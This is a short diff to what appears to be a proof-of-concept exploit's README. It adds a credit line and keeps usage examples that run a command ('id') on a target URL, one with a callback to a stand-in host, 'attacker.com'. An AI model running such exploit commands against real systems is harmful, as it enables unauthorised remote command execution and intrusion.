@@ -19,4 +19,4 @@ python3 poc.py http://target.example.com/ "id" -i
 python3 poc.py http://target.example.com/ "id" --callback http://attacker.com/
 ```
 
-Writeup coming soon
+Writeup coming soon. Credit to Syrex1013
